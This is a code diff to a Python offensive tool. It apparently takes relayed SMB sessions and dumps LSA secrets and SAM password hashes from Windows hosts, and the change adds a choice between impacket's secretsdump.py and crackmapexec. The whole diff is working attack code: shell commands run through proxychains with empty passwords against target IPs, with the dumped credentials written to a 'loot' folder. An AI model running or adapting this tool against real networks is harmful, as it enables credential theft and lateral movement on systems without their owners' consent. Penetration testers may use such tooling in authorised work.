@@ -6,6 +6,7 @@ except ImportError:
 
 import os, sys, json, subprocess
 import concurrent.futures
+import argparse
 
 color_RED = '\033[91m'
 color_GRE = '\033[92m'
@@ -57,8 +58,14 @@ def config_check():
     print('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
 
 
-def mt_execute(username, ip):
-    os.system('sudo proxychains python3 {}/secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(cwd, username, ip, cwd, ip))
+def mt_execute(username, ip, method, secretsdump_path):
+
+    if method == 'secretsdump':
+        os.system('sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(secretsdump_path, username, ip, cwd, ip))
+    elif method == 'crackmapexec':
+        os.system('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(ip, username.split('/')[1], username.split('/')[0]))
+        os.system('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(ip, username.split('/')[1], username.split('/')[0]))
+
     with open('dumped_ips', 'a') as f:
         f.write(ip + '\n')
         f.close()
@@ -70,13 +77,27 @@ if __name__ == '__main__':
         print("{} Must be run as sudo".format(red_exclm))
         sys.exit(1)
 
+    parser = argparse.ArgumentParser(add_help=True)
+    parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
+    parser.add_argument('-sdp', action='store', help='Path to secretsdump.py file (only used if -method is secretsdump) Example -sdp /opt/impacket/examples/secretsdump.py')
+
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+
+    options = parser.parse_args()
+
+    if options.method == 'secretsdump' and options.sdp is None:
+        print('You must enter a path for secretsdump.py')
+        sys.exit(1)
+
     if os.path.isdir("{}/loot".format(cwd)) == False:
         os.makedirs("{}/loot".format(cwd))
 
     config_check()
 
-    if os.path.isfile('{}/secretsdump.py'.format(cwd)) == False:
-        print('Missing secretsdump.py in current directory')
+    if options.method == 'secretsdump' and os.path.isfile(options.sdp) == False:
+        print('Missing secretsdump.py')
         sys.exit(1)
 
     if os.path.isfile('dumped_ips'):
@@ -119,7 +140,7 @@ if __name__ == '__main__':
 
                             # lsa secrets and sam dump courtesy of secretsdump
                             try:
-                                executor.submit(mt_execute, dat[2], dat[1])
+                                executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp)
                             except Exception as e:
                                 print(str(e))
                                 print('Error dumping secrets')
